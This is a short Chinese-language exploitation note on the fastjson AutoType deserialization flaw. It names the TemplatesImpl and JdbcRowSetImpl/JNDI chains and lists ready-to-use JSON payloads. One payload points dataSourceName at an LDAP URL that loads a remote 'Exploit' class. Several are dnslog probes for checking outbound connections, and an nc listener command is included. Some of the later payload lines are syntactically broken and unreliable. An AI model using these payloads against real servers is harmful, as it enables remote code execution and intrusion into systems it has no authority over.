*漏洞核心*：
使用fastjson的AutoType机制去反序列我们精心挑选的恶意类，这些恶意类在反序列时会伴随着加载恶意代码，获取通过请求
外部接口的形式加载恶意代码。

两种利用方式

- 通过 `TemplatesImpl` 类直接指定恶意代码
- 通过 `JdbcRowSetImpl` 获取rmi服务上的恶意代码，恶意代码为JNDI中`Reference`类指定的外部类。

tips:

测试是否外联

1. 开启一个监听端口的服务 `nc -lvvp 9632`
2. 尝试连接
    - 使用ladp
    ``` json
    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:7777/Exploit","autoCommit":true}}}
    ```

    - 使用dnslog回显
    ```json
    {"handsome":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://xxx.dnslog.cn/aaa","autoCommit":true}}
    {"a":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}
    {"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
    {"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}
    {"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dnslog.cn"}}
    {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"xxx.dnslog.cn"}}""}
    {{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:"aaa"}
    Set[{"@type":"java.net.URL","val":"xxx.dnslog.cn"} {{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:0
    
    ```
    